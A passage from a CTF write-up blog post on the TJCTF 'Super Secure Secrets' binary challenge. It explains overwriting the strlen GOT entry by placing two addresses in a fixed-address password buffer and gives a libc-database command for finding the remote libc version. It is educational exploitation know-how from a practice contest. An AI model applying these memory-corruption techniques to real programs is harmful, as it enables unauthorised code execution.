<p><img alt="Super secure secrets flag" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SuperSecureSecrets_flag.png"></p>
<p>One of the problems in this task was how to overwrite <code>strlen</code>. It has to be done in one go since partial overwrites would crash the program as <code>strlen</code> gets called every time we want to store a new message. We also canâ€™t put more than one 64 bit address in our message because of the null byte they contain. The solution was to use <code>password</code> buffer. With PIE disabled it has constant address and as <code>fgets</code> doesnâ€™t stop on null bytes we could enter both addresses we need there (<code>strlen</code> GOT and <code>strlen</code> GOT +2).</p>
<p>The second issue was finding the correct version of libc. For this we can use <a href="https://github.com/niklasb/libc-database">libc-database.</a> After cloning repo we have to run <code>./get</code> to download all configured libc versions and extract symbols. After that we can use it to query for correct libc with:</p>
<div class="highlight"><pre><span></span><code>./find __libc_start_main ab0 fgets b20
</code></pre></div>

<p>We just have to provide a symbol name and last 3 bytes of address.</p>
                </div>
                <footer class="text-right">
                    <p>- F3real</p>
                </footer>
    <div id="show-comments" class="span7 text-center">
        <a href="https://f3real.github.io/tjctf_binary_part2.html#disqus_thread"
          data-disqus-identifier="tjctf_binary_part2"
        class="btn btn-primary twitchy-background">Show Comments</a>
    </div>
    <section id="comments" class="comments hidden">
        <hr/>
        <h2>Comments</h2>
        <div id="disqus_thread"></div>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </section>
            </div>
        </div>
    </article>
</section>
<footer>
    <hr>
    <div class="row">
        <div class="col-lg-10 text-center">
            <p><small>
                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
                &middot;                    &copy; 2024 F3real
            </small></p>
        </div>
    </div>
</footer>            </div>
        </div>
        <!-- /#page-content-wrapper -->
    </div>
    <!-- /#wrapper -->

<!-- disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname

            var disqus_identifier = 'tjctf_binary_part2';
        var disqus_url = 'https://f3real.github.io/tjctf_binary_part2.html';

    var disqus_config = function () {
        this.language = "en";
    };

        var commentsDiv = document.getElementById('show-comments');
        commentsDiv.onclick = function() {
            /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
            this.style.display = 'none';        
        };
</script>
<!-- /disqus -->
    <script>
        const wrapper = document.getElementById('wrapper');
        const sidebarBig = document.getElementById('sidebar-wrapper');
        const sidebarSmall = document.getElementById('sidebar-wrapper-small');

        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
        for (var i = 0; i < triggers.length; i++) { 
            triggers[i].addEventListener('click', (ev) => {
                const elm = ev.currentTarget;    
                ev.preventDefault();
                const selector = elm.getAttribute('href').replace('#','');
                elm.classList.toggle('collapsed');
                document.getElementById(selector).classList.toggle('show');
            }, false);
        } 

        function showBigNav() {;
            sidebarBig.style.display = 'block';
            sidebarSmall.style.display = 'none';
        }
        function showSmallNav() {
            sidebarBig.style.display = 'none';
            sidebarSmall.style.display = 'block';
        }

        const mediaQuery = window.matchMedia('(min-width:768px)');
        mediaQuery.onchange = e => {
            if (wrapper.classList.contains('toggled')) {
                    wrapper.classList.remove('toggled');
            } else {
                if (e.matches) {
                    showBigNav();
                } else {
                    showSmallNav();
                }
            }
        }

        function setNavbar() {
            var condition = wrapper.classList.contains('toggled');
            if (!mediaQuery.matches) {
                condition = !condition;
            }
            if (condition) {
                showSmallNav();
            } else {
                showBigNav();
            }
        }

        function toggleMenu(){
            wrapper.classList.toggle('toggled');
            setNavbar();
        }

        window.onload = setNavbar;
    </script>
	<script data-goatcounter="https://f3real.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>
</body>
</html>